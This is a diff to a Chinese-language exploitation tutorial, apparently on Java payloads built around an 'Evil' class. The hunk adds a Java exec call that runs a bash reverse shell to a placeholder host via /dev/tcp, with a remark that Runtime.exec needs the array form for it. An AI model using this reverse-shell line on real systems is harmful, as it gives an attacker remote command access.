@@ -70,7 +70,14 @@ public class Evil {
 
 这里注意一点，java的`Runtime.getRuntime().exec(command)`反弹shell需要修改写法，原因在exec的重载方法里，具体可参考
 
+
+
 - [Java Runtime.exe() 执行命令与反弹shell](https://www.jianshu.com/p/ae3922db1f70)
+
+```java
+exec(new String[]{"bash","-c","bash -i >& /dev/tcp/xx.xx.xx.xx/6543 0>&1")
+```
+反弹shell 应该用数组形式
 
 ```java
 public class Evil {
